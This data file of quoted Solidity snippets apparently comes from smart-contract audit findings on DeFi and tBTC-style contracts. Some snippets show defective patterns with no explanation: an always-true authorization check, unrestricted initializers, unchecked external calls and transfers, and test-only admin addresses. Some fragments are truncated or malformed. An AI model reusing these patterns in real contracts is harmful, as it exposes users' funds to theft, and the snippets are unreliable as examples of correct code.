"```\nfunction matchOrders(\n    LibOrder.OrderParam memory takerOrderParam,\n    LibOrder.OrderParam[] memory makerOrderParams,\n    address _perpetual,\n    uint256[] memory amounts\n) public {\n```\n```\nfunction matchOrderWithAMM(\n    LibOrder.OrderParam memory takerOrderParam,\n    address _perpetual,\n    uint256 amount\n) public {\n```"
"```\nuint256 liquidatableAmount = totalPositionSize.sub(totalPositionSize.mod(governance.lotSize));\nliquidatableAmount = liquidatableAmount.ceil(governance.lotSize).min(maxAmount).min(liquidatableAmount);\n```\n```\nelse if (key == ""lotSize"") {\n    require(\n        governance.tradingLotSize == 0 || governance.tradingLotSize.mod(value.toUint256()) == 0,\n        ""require tls % ls == 0""\n    );\n    governance.lotSize = value.toUint256();\n} else if (key == ""tradingLotSize"") {\n    require(\n        governance.lotSize == 0 || value.toUint256().mod(governance.lotSize) == 0,\n        ""require tls % ls == 0""\n    );\n    governance.tradingLotSize = value.toUint256();\n```\n```\nuint256 amount = shareAmount.wmul(oldPoolPositionSize).wdiv(shareToken.totalSupply());\namount = amount.sub(amount.mod(perpetualProxy.lotSize()));\n\nperpetualProxy.transferBalanceOut(trader, price.wmul(amount).mul(2));\nburnShareTokenFrom(trader, shareAmount);\n\nuint256 opened = perpetualProxy.trade(trader, LibTypes.Side.LONG, price, amount);\n```"
"```\nint256 public constant chainlinkDecimalsAdapter = 10 ** 10;\n\nconstructor(address _feeder) public {\n    feeder = IChainlinkFeeder(_feeder);\n}\n\nfunction price() public view returns (uint256 newPrice, uint256 timestamp) {\n    newPrice = (feeder.latestAnswer() * chainlinkDecimalsAdapter).toUint256();\n    timestamp = feeder.latestTimestamp();\n}\n```\n```\nint256 public constant chainlinkDecimalsAdapter = 10 ** 10;\n\nconstructor(address _feeder) public {\n    feeder = IChainlinkFeeder(_feeder);\n}\n\nfunction price() public view returns (uint256 newPrice, uint256 timestamp) {\n    newPrice = ONE / (feeder.latestAnswer() * chainlinkDecimalsAdapter).toUint256();\n    timestamp = feeder.latestTimestamp();\n}\n```\n```\ntimestamp = feeder.latestTimestamp()\n```"
"```\nfunction beginGlobalSettlement(uint256 price) public onlyWhitelistAdmin {\n    require(status!= LibTypes.Status.SETTLED, ""already settled"");\n    settlementPrice = price;\n    status = LibTypes.Status.SETTLING;\n    emit BeginGlobalSettlement(price);\n}\n```\n```\nfunction endGlobalSettlement() public onlyWhitelistAdmin {\n    require(status == LibTypes.Status.SETTLING, ""wrong perpetual status"");\n\n    address guy = address(amm.perpetualProxy());\n    settleFor(guy);\n    status = LibTypes.Status.SETTLED;\n\n    emit EndGlobalSettlement();\n}\n```"
"```\nstruct Order {\n    address trader;\n    address broker;\n    address perpetual;\n    uint256 amount;\n    uint256 price;\n\n    // Data contains the following values packed into 32 bytes\n    // ╔════════════════════╤═══════════════════════════════════════════════════════════╗\n    // ║ │ length(bytes) desc ║\n    // ╟────────────────────┼───────────────────────────────────────────────────────────╢\n    // ║ version │ 1 order version ║\n    // ║ side │ 1 0: buy (long), 1: sell (short) ║\n    // ║ isMarketOrder │ 1 0: limitOrder, 1: marketOrder ║\n    // ║ expiredAt │ 5 order expiration time in seconds ║\n    // ║ asMakerFeeRate │ 2 maker fee rate (base 100,000) ║\n    // ║ asTakerFeeRate │ 2 taker fee rate (base 100,000) ║\n    // ║ (d) makerRebateRate│ 2 rebate rate for maker (base 100) ║\n    // ║ salt │ 8 salt ║\n    // ║ isMakerOnly │ 1 is maker only ║\n    // ║ isInversed │ 1 is inversed contract ║\n    // ║ │ 8 reserved ║\n    // ╚════════════════════╧═══════════════════════════════════════════════════════════╝\n    bytes32 data;\n}\n```\n```\nfunction isValidSignature(\n    OrderSignature memory signature,\n    bytes32 hash,\n    address signerAddress\n)\n    internal\n    pure\n    returns (bool)\n{\n    uint8 method = uint8(signature.config[1]);\n    address recovered;\n    uint8 v = uint8(signature.config[0]);\n\n    if (method == uint8(SignatureMethod.ETH_SIGN)) {\n        recovered = ecrecover(\n            keccak256(abi.encodePacked(""\x19Ethereum Signed Message: 32"", hash)),\n            v,\n            signature.r,\n            signature.s\n        );\n    } else if (method == uint8(SignatureMethod.EIP712)) {\n        recovered = ecrecover(hash, v, signature.r, signature.s);\n    } else {\n        revert(""invalid sign method"");\n    }\n\n    return signerAddress == recovered;\n}\n```"
"```\nfunction validateOrderParam(\n    IPerpetual perpetual,\n    LibOrder.OrderParam memory orderParam\n) internal\nview\nreturns (bytes32) {\n    address broker = perpetual.currentBroker(orderParam.trader);\n    require(broker == msg.sender, ""invalid broker"");\n    require(orderParam.getOrderVersion() == 2, ""unsupported version"");\n    require(orderParam.getExpiredAt() >= block.timestamp, ""order expired"");\n\n    bytes32 orderHash = orderParam.getOrderHash(address(perpetual), broker);\n    require(orderParam.signature.isValidSignature(orderHash, orderParam.trader), ""invalid signature"");\n    require(filled[orderHash] < orderParam.amount, ""fullfilled order"");\n\n    return orderHash;\n}\n```"
"```\nfunction wpowi(int256 x, int256 n) internal pure returns (int256 z) {\n    z = n % 2!= 0? x : _WAD;\n\n    for (n /= 2; n!= 0; n /= 2) {\n        x = wmul(x, x);\n\n        if (n % 2!= 0) {\n            z = wmul(z, x);\n        }\n    }\n}\n```"
```\npragma solidity ^0.5.2;\npragma experimental ABIEncoderV2;\n```
```\nuint256 private constant ONE_WAD_U = 10**18;\n```
"```\nconstructor(\n    address globalConfig,\n    address devAddress,\n    address collateral,\n    uint256 collateralDecimals\n) public Position(collateral, collateralDecimals) {\n    setGovernanceAddress(""globalConfig"", globalConfig);\n    setGovernanceAddress(""dev"", devAddress);\n    emit CreatePerpetual();\n}\n```"
"```\nconstructor(address _collateral, uint256 decimals) public {\n    require(decimals <= MAX_DECIMALS, ""decimals out of range"");\n    require(_collateral!= address(0x0) || (_collateral == address(0x0) && decimals == 18), ""invalid decimals"");\n\n    collateral = _collateral;\n    scaler = (decimals == MAX_DECIMALS? 1 : 10** (MAX_DECIMALS - decimals)).toInt256();\n}\n```"
"```\nfunction mint(address account, uint256 amount) public onlyMinter returns (bool) {\n    _mint(account, amount);\n    return true;\n}\n```\n```\nfunction mintShareTokenTo(address guy, uint256 amount) internal {\n    shareToken.mint(guy, amount);\n}\n```"
"```\nfunction beginGlobalSettlement(uint256 price) public onlyWhitelistAdmin {\n    require(status!= LibTypes.Status.SETTLED, ""already settled"");\n    settlementPrice = price;\n    status = LibTypes.Status.SETTLING;\n    emit BeginGlobalSettlement(price);\n}\n```"
"```\nenum OrderStatus {\n    EXPIRED,\n    CANCELLED,\n    FILLABLE,\n    FULLY_FILLED\n}"
```\nlibrary LibMathUnsigned {\n    uint256 private constant _WAD = 10**18;\n    uint256 private constant _UINT256_MAX = 2**255 - 1;\n}
"```\nfunction wln(int256 x) internal pure returns (int256) {\n    require(x > 0, ""logE of negative number"");\n    require(x <= 10000000000000000000000000000000000000000, ""logE only accepts v <= 1e22 * 1e18"");\n    int256 r = 0;\n    uint8 extra_digits = longer_digits - fixed_digits;\n```"
"```\nfunction roundHalfUp(int256 x, int256 y) internal pure returns (int256) {\n    require(y > 0, ""roundHalfUp only supports y > 0"");\n    if (x >= 0) {\n        return x + y / 2;\n    }\n    return x - y / 2;\n}\n```"
"```\nfunction min(int256 x, int256 y) internal pure returns (int256 z) {\n    return x <= y? x : y;\n}\n\nfunction max(int256 x, int256 y) internal pure returns (int256 z) {\n    return x >= y? x : y;\n}\n```\n```\nfunction min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n    return x <= y? x : y;\n}\n\nfunction max(uint256 x, uint256 y) internal pure returns (uint256 z) {\n    return x >= y? x : y;\n}\n```\n```\nfunction getOrderHash(Order memory order) internal pure returns (bytes32 orderHash) {\n    orderHash = LibEIP712.hashEIP712Message(hashOrder(order));\n    return orderHash;\n}\n```\n```\nfunction hashOrder(Order memory order) internal pure returns (bytes32 result) {\n    bytes32 orderType = EIP712_ORDER_TYPE;\n    assembly {\n        let start := sub(order, 32)\n        let tmp := mload(start)\n        mstore(start, orderType)\n        result := keccak256(start, 224)\n        mstore(start, tmp)\n    }\n    return result;\n}\n```"
"```\nuint tokenInRatio = bdiv(newTokenBalanceIn, tokenBalanceIn);\n\nuint poolRatio = bpow(tokenInRatio, normalizedWeight);\n```\n```\nuint normalizedWeight = bdiv(tokenWeightOut, totalWeight);\n\nuint poolAmountInAfterExitFee = bmul(poolAmountIn, bsub(BONE, EXIT_FEE));\n```"
"```\nfunction rebind(address token, uint balance, uint denorm)\n    public\n{\n    _logs_\n    _lock_\n\n    require(msg.sender == _controller, ""ERR_NOT_CONTROLLER"");\n    require(_records[token].bound, ""ERR_NOT_BOUND"");\n    require(!_finalized, ""ERR_IS_FINALIZED"");\n\n    require(denorm >= MIN_WEIGHT, ""ERR_MIN_WEIGHT"");\n    require(denorm <= MAX_WEIGHT, ""ERR_MAX_WEIGHT"");\n    require(balance >= MIN_BALANCE, ""ERR_MIN_BALANCE"");\n}\n```"
"```\nwhitelistingAddress = _whitelistingAddress;\nprojectAddress = _projectAddress;\nfreezerAddress = _projectAddress;  # TODO change, here only for testing\nrescuerAddress = _projectAddress;  # TODO change, here only for testing\n```"
```\nfunction getCurrentStage() public view returns (uint8) {\n    return getStageAtBlock(getCurrentBlockNumber());\n}\n```\n```\nfunction getCurrentBlockNumber() public view returns (uint256) {\n    return uint256(block.number).sub(frozenPeriod);\n}\n```\n```\nfunction getStageAtBlock(uint256 _blockNumber) public view returns (uint8) {\n    uint256 blockNumber = _blockNumber.sub(frozenPeriod); // adjust the block by the frozen period\n```
"```\nskyweaverAssets.batchMint(\n    _order.cardRecipient,\n    _ids,\n    amounts,\n    """"\n)"
"```\nfunction _commit(uint256 _weaveAmount, GoldOrder memory _order) internal {\n    // Check if weave sent is sufficient for order\n    uint256 total_cost = _order.cardAmount.mul(goldPrice).add(_order.feeAmount);\n    uint256 refund_amount = _weaveAmount.sub(total_cost); // Will throw if insufficient amount received\n```\n```\nuint256 weave_to_burn = (_order.cardAmount.mul(goldPrice)).sub(_order.cardAmount.mul(goldRefund));\nweaveContract.burn(weaveID, weave_to_burn);\n```"
"```\nuint256 refundAmount = _arcAmount.sub(total_cost);\nif (refundAmount > 0) {\n    arcadeumCoin.safeTransferFrom(address(this), _recipient, arcadeumCoinID, refundAmount, """");\n}\n\nfactoryManager.batchMint(_recipient, _ids, amounts_to_mint, """");\n```"
"```\nfunction setMaxSupplies(uint256[] calldata _ids, uint256[] calldata _newMaxSupplies) external onlyOwner() {\n    require(_ids.length == _newMaxSupplies.length, ""SWSupplyManager#setMaxSupply: INVALID_ARRAYS_LENGTH"");\n\n    for (uint256 i = 0; i < _ids.length; i++) {\n        if (maxSupply[_ids[i]] > 0) {\n            require(\n                0 < _newMaxSupplies[i] && _newMaxSupplies[i] < maxSupply[_ids[i]],\n                ""SWSupplyManager#setMaxSupply: INVALID_NEW_MAX_SUPPLY""\n            );\n        }\n        maxSupply[_ids[i]] = _newMaxSupplies[i];\n    }\n\n    emit MaxSuppliesChanged(_ids, _newMaxSupplies);\n}\n```\n```\nfunction burn(\n    uint256 _id,\n    uint256 _amount)\n  external\n{\n    _burn(msg.sender, _id, _amount);\n}\n```"
"```\nfunction importScore(address _worker) external override {\n    require(!m_v3_scoreImported[_worker], ""score-already-imported"");\n    m_workerScores[_worker] = m_workerScores[_worker].max(m_v3_iexecHub.viewScore(_worker));\n    m_v3_scoreImported[_worker] = true;\n}\n```"
"```\nfunction _domain() internal view returns (IexecLibOrders_v5.EIP712Domain memory) {\n    return IexecLibOrders_v5.EIP712Domain({\n        name: ""iExecODB"",\n        version: ""3.0-alpha"",\n        chainId: _chainId(),\n        verifyingContract: address(this)\n    });\n}\n```"
```\nif (char == 0x3B)  # 0x3B = ';'\n```
"```\nfunction recoverStake(address _operator) public {\n    uint256 operatorParams = operators[_operator].packedParams;\n    require(\n        block.number > operatorParams.getUndelegationBlock().add(undelegationPeriod),\n        ""Can not recover stake before undelegation period is over.""\n    );\n}"
"```\nfunction requestNewKeep(uint256 _m, uint256 _n, uint256 _bond)\n    external\n    payable\n    returns (address)\n{\n    IBondedECDSAKeepVendor _keepVendor = IBondedECDSAKeepVendor(keepVendor);\n    IBondedECDSAKeepFactory _keepFactory = IBondedECDSAKeepFactory(_keepVendor.selectFactory());\n    return _keepFactory.openKeep.value(msg.value)(_n, _m, msg.sender, _bond);\n}\n```"
"```\nfunction setSignerFeeDivisor(uint256 _signerFeeDivisor)\n    external\n    onlyOwner\n{\n    require(_signerFeeDivisor > 9, ""Signer fee divisor must be greater than 9, for a signer fee that is <= 10%."");\n    signerFeeDivisor = _signerFeeDivisor;\n    emit SignerFeeDivisorUpdated(_signerFeeDivisor);\n}\n```\n```\n/**\n * @dev Upgrade current implementation.\n * @param _implementation Address of the new implementation contract.\n */\nfunction upgradeTo(address _implementation)\n    public\n    onlyOwner\n{\n    address currentImplementation = implementation();\n    require(_implementation!= address(0), ""Implementation address can't be zero."");\n    require(_implementation!= currentImplementation, ""Implementation address must be different from the current one."");\n    setImplementation(_implementation);\n    emit Upgraded(_implementation);\n}\n```\n```\nfunction upgradeTo(address _implementation) public onlyOwner {\n    address currentImplementation = implementation();\n    require(\n        _implementation!= address(0),\n        ""Implementation address can't be zero.""\n    );\n    require(\n        _implementation!= currentImplementation,\n        ""Implementation address must be different from the current one.""\n    );\n    setImplementation(_implementation);\n    emit Upgraded(_implementation);\n}\n```\n```\nfunction registerFactory(address payable _factory) external onlyOperatorContractUpgrader {\n    require(_factory!= address(0), ""Incorrect factory address"");\n    require(\n        registry.isApprovedOperatorContract(_factory),\n        ""Factory contract is not approved""\n    );\n    keepFactory = _factory;\n}\n```"
"```\n/**\n * @dev Function used to inform about the fact the currently ongoing\n * new relay entry generation operation timed out. As a result, the group\n * which was supposed to produce a new relay entry is immediately\n * terminated and a new group is selected to produce a new relay entry.\n * All members of the group are punished by seizing minimum stake of\n * their tokens. The submitter of the transaction is rewarded with a\n * tattletale reward which is limited to min(1, 20 / group_size) of the\n * maximum tattletale reward.\n */\nfunction reportRelayEntryTimeout() public {\n    require(hasEntryTimedOut(), ""Entry did not time out"");\n    groups.reportRelayEntryTimeout(signingRequest.groupIndex, groupSize, minimumStake);\n\n    if (numberOfGroups() > 0) {\n        signRelayEntry(\n            signingRequest.relayRequestId,\n            signingRequest.previousEntry,\n            signingRequest.serviceContract,\n            signingRequest.entryVerificationAndProfitFee,\n            signingRequest.callbackFee\n        );\n    }\n}\n```"
"```\n/**\n * Reports unauthorized signing for the provided group. Must provide\n * a valid signature of the group address as a message. Successful signature\n * verification means the private key has been leaked and all group members\n * should be punished by seizing their tokens. The submitter of this proof is\n * rewarded with 5% of the total seized amount scaled by the reward adjustment\n * parameter and the rest 95% is burned.\n */\nfunction reportUnauthorizedSigning(\n    uint256 groupIndex,\n    bytes memory signedGroupPubKey\n) public {\n    groups.reportUnauthorizedSigning(groupIndex, signedGroupPubKey, minimumStake);\n}\n```"
```\nfunction approveOperatorContract(address operatorContract) public onlyRegistryKeeper {\n    operatorContracts[operatorContract] = 1;\n}\n\nfunction disableOperatorContract(address operatorContract) public onlyPanicButton {\n    operatorContracts[operatorContract] = 2;\n}\n```
"```\nfunction retrieveSignerPubkey(DepositUtils.Deposit storage _d) public {\n    require(_d.inAwaitingSignerSetup(), ""Not currently awaiting signer setup"");\n\n    bytes memory _publicKey = IBondedECDSAKeep(_d.keepAddress).getPublicKey();\n    require(_publicKey.length == 64, ""public key not set or not 64-bytes long"");\n```\n```\nfunction provideBTCFundingProof(\n    DepositUtils.Deposit storage _d,\n    bytes4 _txVersion,\n    bytes memory _txInputVector,\n    bytes memory _txOutputVector,\n    bytes4 _txLocktime,\n    uint8 _fundingOutputIndex,\n    bytes memory _merkleProof,\n    uint256 _txIndexInBlock,\n    bytes memory _bitcoinHeaders\n) public returns (bool) {\n    require(_d.inAwaitingBTCFundingProof(), ""Not awaiting funding"");\n\n    bytes8 _valueBytes;\n    bytes memory _utxoOutpoint;\n```\n```\n/// @notice Goes from courtesy call to active\n/// @dev Only callable if collateral is sufficient and the deposit is not expiring\nfunction exitCourtesyCall(DepositUtils.Deposit storage _d) public {\n    require(_d.inCourtesyCall(), ""Not currently in courtesy call"");\n    require(block.timestamp <= _d.fundedAt + TBTCConstants.getDepositTerm(), ""Deposit is expiring"");\n    require(getCollateralizationPercentage(_d) >= _d.undercollateralizedThresholdPercent, ""Deposit is still undercollateralized"");\n    _d.setActive();\n    _d.logExitedCourtesyCall();\n}\n```\n```\nfunction notifyDepositExpiryCourtesyCall(DepositUtils.Deposit storage _d) public {\n    require(_d.inActive(), ""Deposit is not active"");\n    require(block.timestamp >= _d.fundedAt + TBTCConstants.getDepositTerm(), ""Deposit term not elapsed"");\n    _d.setCourtesyCall();\n    _d.logCourtesyCalled();\n    _d.courtesyCallInitiated = block.timestamp;\n}\n```"
"```\nfunction retrieveSignerPubkey(DepositUtils.Deposit storage _d) public {\n    require(_d.inAwaitingSignerSetup(), ""Not currently awaiting signer setup"");\n\n    bytes memory publicKey = IBondedECDSAKeep(_d.keepAddress).getPublicKey();\n    require(publicKey.length == 64, ""public key not set or not 64-bytes long"");\n\n    _d.signingGroupPubkeyX = publicKey.slice(0, 32).toBytes32();\n    _d.signingGroupPubkeyY = publicKey.slice(32, 32).toBytes32();\n    require(_d.signingGroupPubkeyY!= bytes32(0) && _d.signingGroupPubkeyX!= bytes32(0), ""Keep returned bad pubkey"");\n    _d.fundingProofTimerStart = block.timestamp;\n\n    _d.setAwaitingBTCFundingProof();\n    _d.logRegisteredPubkey(\n        _d.signingGroupPubkeyX,\n        _d.signingGroupPubkeyY);\n}\n```\n```\nfunction notifySignerSetupFailure(DepositUtils.Deposit storage _d) public {\n    require(_d.inAwaitingSignerSetup(), ""Not awaiting setup"");\n    require(\n        block.timestamp > _d.signingGroupRequestedAt + TBTCConstants.getSigningGroupFormationTimeout(),\n        ""Signing group formation timeout not yet elapsed""\n    );\n    _d.setFailedSetup();\n    _d.logSetupFailed();\n\n    fundingTeardown(_d);\n}\n```"
"```\nfunction validateVin(bytes memory _vin) internal pure returns (bool) {\n    uint256 _offset = 1;\n    uint8 _nIns = uint8(_vin.slice(0, 1)[0]);\n\n    if (_nIns >= 0xfd || _nIns == 0) {\n        return false;\n    }\n```\n```\nfunction determineOutputLength(bytes memory _output) internal pure returns (uint256) {\n    uint8 _len = uint8(_output.slice(8, 1)[0]);\n    require(_len < 0xfd, ""Multi-byte VarInts not supported"");\n\n    return _len + 8 + 1; // 8 byte value, 1 byte for _len itself\n}\n```\n```\nfunction findAndParseFundingOutput(\n    DepositUtils.Deposit storage _d,\n    bytes memory _txOutputVector,\n    uint8 _fundingOutputIndex\n) public view returns (bytes8) {\n```\n```\nfunction validateAndParseFundingSPVProof(\n    DepositUtils.Deposit storage _d,\n    bytes4 _txVersion,\n    bytes memory _txInputVector,\n    bytes memory _txOutputVector,\n    bytes4 _txLocktime,\n    uint8 _fundingOutputIndex,\n    bytes memory _merkleProof,\n    uint256 _txIndexInBlock,\n    bytes memory _bitcoinHeaders\n) public view returns (bytes8 _valueBytes, bytes memory _utxoOutpoint) {\n```\n```\nfunction provideFraudBTCFundingProof(\n    DepositUtils.Deposit storage _d,\n    bytes4 _txVersion,\n    bytes memory _txInputVector,\n    bytes memory _txOutputVector,\n    bytes4 _txLocktime,\n    uint8 _fundingOutputIndex,\n    bytes memory _merkleProof,\n    uint256 _txIndexInBlock,\n    bytes memory _bitcoinHeaders\n) public returns (bool) {\n```\n```\nfunction provideBTCFundingProof(\n    DepositUtils.Deposit storage _d,\n    bytes4 _txVersion,\n    bytes memory _txInputVector,\n    bytes memory _txOutputVector,\n    bytes4 _txLocktime,\n    uint8 _fundingOutputIndex,\n    bytes memory _merkleProof,\n    uint256 _txIndexInBlock,\n    bytes memory _bitcoinHeaders\n) public returns (bool) {\n```\n```\nfunction provideSPVFraudProof(\n    DepositUtils.Deposit storage _d,\n    bytes4 _txVersion,\n    bytes memory _txInputVector,\n    bytes memory _txOutputVector,\n    bytes4 _txLocktime,\n    bytes memory _merkleProof,\n    uint256 _txIndexInBlock,\n    uint8 _targetInputIndex,\n    bytes memory _bitcoinHeaders\n) public {\n```"
"```\nfunction extractTarget(bytes memory _header) internal pure returns (uint256) {\n    bytes memory _m = _header.slice(72, 3);\n    uint8 _e = uint8(_header[75]);\n    uint256 _mantissa = bytesToUint(reverseEndianness(_m));\n    uint _exponent = _e - 3;\n\n    return _mantissa * (256 ** _exponent);\n}\n```\n```\nfunction determineOutputLength(bytes memory _output) internal pure returns (uint256) {\n    uint8 _len = uint8(_output.slice(8, 1)[0]);\n    require(_len < 0xfd, ""Multi-byte VarInts not supported"");\n\n    return _len + 8 + 1; // 8 byte value, 1 byte for _len itself\n}\n```\n```\nfunction extractHash(bytes memory _output) internal pure returns (bytes memory) {\n    if (uint8(_output.slice(9, 1)[0]) == 0) {\n        uint256 _len = uint8(extractOutputScriptLen(_output)[0]) - 2;\n        // Check for maliciously formatted witness outputs\n        if (uint8(_output.slice(10, 1)[0])!= uint8(_len)) {\n            return bytes32("""");\n        }\n        return _output.slice(11, _len);\n    } else {\n        bytes32 _tag = _output.keccak256Slice(8, 3);\n```\n```\nfunction slice(bytes memory _bytes, uint _start, uint _length) internal pure returns (bytes memory res) {\n    require(_bytes.length >= (_start + _length), ""Slice out of bounds"");\n```\n```\nfunction toUint(bytes memory _bytes, uint _start) internal pure returns (uint256) {\n    require(_bytes.length >= (_start + 32), ""Uint conversion out of bounds."");\n```\n```\nfunction toAddress(bytes memory _bytes, uint _start) internal pure returns (address) {\n    require(_bytes.length >= (_start + 20), ""Address conversion out of bounds."");\n}\n```\nfunction slice(bytes memory _bytes, uint _start, uint _length) internal pure returns (bytes memory res) {\n    require(_bytes.length >= (_start + _length), ""Slice out of bounds"");\n```\n```\nfunction keccak256Slice(bytes memory _bytes, uint _start, uint _length) pure internal returns (bytes32 result) {\n    require(_bytes.length >= (_start + _length), ""Slice out of bounds"");\n```"
```\nfunction startSignerAbortLiquidation(DepositUtils.Deposit storage _d) internal {\n    _d.logStartedLiquidation(false);\n    // Reclaim used state for gas savings\n    _d.redemptionTeardown();\n    _d.seizeSignerBonds();\n\n    _d.liquidationInitiated = block.timestamp;  // Store the timestamp for auction\n    _d.liquidationInitiator = msg.sender;\n    _d.setFraudLiquidationInProgress();\n}\n```
"```\nfunction provideECDSAFraudProof(\n    DepositUtils.Deposit storage _d,\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s,\n    bytes32 _signedDigest,\n    bytes memory _preimage\n) public {\n    require(\n       !_d.inFunding() &&!_d.inFundingFailure(),\n        ""Use provideFundingECDSAFraudProof instead""\n    );\n    require(\n       !_d.inSignerLiquidation(),\n        ""Signer liquidation already in progress""\n    );\n    require(!_d.inEndState(), ""Contract has halted"");\n    require(submitSignatureFraud(_d, _v, _r, _s, _signedDigest, _preimage), ""Signature is not fraud"");\n    startSignerFraudLiquidation(_d);\n}\n```\n```\nfunction provideFundingECDSAFraudProof(\n    DepositUtils.Deposit storage _d,\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s,\n    bytes32 _signedDigest,\n    bytes memory _preimage\n) public {\n    require(\n        _d.inAwaitingBTCFundingProof(),\n        ""Signer fraud during funding flow only available while awaiting funding""\n    );\n\n    bool _isFraud = _d.submitSignatureFraud(_v, _r, _s, _signedDigest, _preimage);\n    require(_isFraud, ""Signature is not fraudulent"");\n    _d.logFraudDuringSetup();\n\n    if (block.timestamp > _d.fundingProofTimerStart + TBTCConstants.getFundingTimeout()) {\n        address(0).transfer(address(this).balance);  // Burn it all down (fire emoji)\n        _d.setFailedSetup();\n    } else {\n        _d.fundingProofTimerStart = block.timestamp;\n        _d.setFraudAwaitingBTCFundingProof();\n    }\n}\n```\n```\nuint256 contractEthBalance = address(this).balance;\naddress payable initiator = _d.liquidationInitiator;\n\nif (initiator == address(0)) {\n    initiator = address(0xdead);\n}\nif (contractEthBalance > 1) {\n    if (_wasFraud) {\n        initiator.transfer(contractEthBalance);\n    } else {\n        uint256 split = contractEthBalance.div(2);\n        _d.pushFundsToKeepGroup(split);\n        initiator.transfer(split);\n    }\n}\n```"
```\nfunction approvedToLog(address _caller) public pure returns (bool) {\n    return true;\n}\n```
"```\nbytes32 resultHash = keccak256(\n    abi.encodePacked(groupPubKey, misbehaved)\n);"
"```\n/**\n * @dev Creates a request to generate a new relay entry, which will include\n * a random number (by signing the previous entry's random number).\n * @param callbackContract Callback contract address.\n * @param callbackMethod Callback contract method signature.\n * @param callbackGas Gas required for the callback.\n * @return An uint256 representing uniquely generated relay request ID.\n */\nfunction requestRelayEntry(\n    address callbackContract,\n    string memory callbackMethod,\n    uint256 callbackGas\n) public nonReentrant payable returns (uint256) {\n```\n```\n/**\n * @dev Executes customer specified callback for the relay entry request.\n * @param requestId Request id tracked internally by this contract.\n * @param entry The generated random number.\n * @return Address to receive callback surplus.\n */\nfunction executeCallback(uint256 requestId, uint256 entry) public returns (address payable surplusRecipient) {\n    require(\n        _operatorContracts.contains(msg.sender),\n        ""Only authorized operator contract can call execute callback.""\n    );\n\n    require(\n        _callbacks[requestId].callbackContract!= address(0),\n        ""Callback contract not found""\n    );\n\n    _callbacks[requestId].callbackContract.call(abi.encodeWithSignature(_callbacks[requestId].callbackMethod, entry));\n\n    surplusRecipient = _callbacks[requestId].surplusRecipient;\n    delete _callbacks[requestId];\n}\n```\n```\nmodifier onlyServiceContract() {\n    require(\n        serviceContracts.contains(msg.sender),\n        ""Caller is not an authorized contract""\n    );\n    _\n}\n```"
"```\nfunction provideRedemptionSignature(\n    DepositUtils.Deposit storage _d,\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s\n) public {\n    require(_d.inAwaitingWithdrawalSignature(), ""Not currently awaiting a signature"");\n\n    // The signature must be valid on the pubkey\n    require(\n        _d.signerPubkey().checkSig(\n            _d.lastRequestedDigest,\n            _v,\n            _r,\n            _s\n        ),\n        ""Invalid signature""\n    )\n```"
"```\ntoken.safeTransferFrom(\n    _from,\n    address(this),\n    _amount\n);\n```\ntoken.transferFrom(\n    _from,\n    address(this),\n    _value\n);\n```\ntoken.safeTransfer(owner, amount)\n```\n```\ntoken.transfer(tattletale, tattletaleReward)\n```\n```\ntoken.transferFrom(\n    msg.sender,\n    tokenStaking.magpieOf(members[i]),\n    dividend\n)"
"```\nfunction initialize(\n    address registryAddress\n) public {\n    require(!initialized(), ""Contract is already initialized."");\n    _initialized[""BondedECDSAKeepVendorImplV1""] = true;\n    registry = Registry(registryAddress);\n}\n```\n```\nfunction initialize(\n    uint256 priceFeedEstimate,\n    uint256 fluctuationMargin,\n    uint256 dkgContributionMargin,\n    uint256 withdrawalDelay,\n    address registry\n) public {\n    require(!initialized(), ""Contract is already initialized."");\n    _initialized[""KeepRandomBeaconServiceImplV1""] = true;\n    _priceFeedEstimate = priceFeedEstimate;\n    _fluctuationMargin = fluctuationMargin;\n    _dkgContributionMargin = dkgContributionMargin;\n    _withdrawalDelay = withdrawalDelay;\n    _pendingWithdrawal = 0;\n    _previousEntry = _beaconSeed;\n    _registry = registry;\n    _baseCallbackGas = 18845;\n}\n```\n```\ncontract DepositFactoryAuthority {\n\n    bool internal _initialized = false;\n    address internal _depositFactory;\n\n    function initialize(address _factory) public {\n        require(! _initialized, ""Factory can only be initialized once."");\n        _depositFactory = _factory;\n        _initialized = true;\n    }\n```"
"```\nif (subsidyPool < msg.value) {\n    uint256 signerSubsidy = subsidyPool;\n} else {\n    uint256 signerSubsidy = msg.value;\n}\nif (signerSubsidy > 0) {\n    subsidyPool -= signerSubsidy;\n    keep.distributeETHToMembers.value(signerSubsidy)();\n}\n```\n```\n(bool success,) = address(randomBeacon).call.gas(400000).value(msg.value)(\n    abi.encodeWithSignature(\n        ""requestRelayEntry(address,string,uint256)"",\n        address(this),\n        ""setGroupSelectionSeed(uint256)"",\n        callbackGas\n    )\n);\n\nif (!success) {\n    subsidyPool += msg.value;  // beacon is busy\n}\n```"
"```\n/**\n * @notice Receives approval of token transfer and stakes the approved amount.\n * @dev Makes sure provided token contract is the same one linked to this contract.\n * @param _from The owner of the tokens who approved them to transfer.\n * @param _value Approved amount for the transfer and stake.\n * @param _token Token contract address.\n * @param _extraData Data for stake delegation. This byte array must have the\n * following values concatenated: Magpie address (20 bytes) where the rewards for participation\n * are sent, operator's (20 bytes) address, authorizer (20 bytes) address.\n */\nfunction receiveApproval(address _from, uint256 _value, address _token, bytes memory _extraData) public {\n    require(ERC20Burnable(_token) == token, ""Token contract must be the same one linked to this contract."");\n    require(_value <= token.balanceOf(_from), ""Sender must have enough tokens."");\n    require(_extraData.length == 60, ""Stake delegation data must be provided."");\n\n    address payable magpie = address(uint160(_extraData.toAddress(0)));\n    address operator = _extraData.toAddress(20);\n    require(operators[operator].owner == address(0), ""Operator address is already in use."");\n    address authorizer = _extraData.toAddress(40);\n\n    // Transfer tokens to this contract.\n    token.transferFrom(_from, address(this), _value);\n\n    operators[operator] = Operator(_value, block.number, 0, _from, magpie, authorizer);\n    ownerOperators[_from].push(operator);\n\n    emit Staked(operator, _value);\n}\n```"
"```\nrequire(block.timestamp >= _d.withdrawalRequestTime + TBTCConstants.getIncreaseFeeTimer(), ""Fee increase not yet permitted"")\n```\n```\nuint256 _previousOutputValue = DepositUtils.bytes8LEToUint(_previousOutputValueBytes);\n_newOutputValue = DepositUtils.bytes8LEToUint(_newOutputValueBytes);\nrequire(_previousOutputValue.sub(_newOutputValue) == _d.initialRedemptionFee, ""Not an allowed fee step"");\n```\nrequire(\n    _d.utxoSize().sub(_fundingOutputValue) <= _d.initialRedemptionFee * 5,\n    ""Fee unexpectedly very high""\n)"
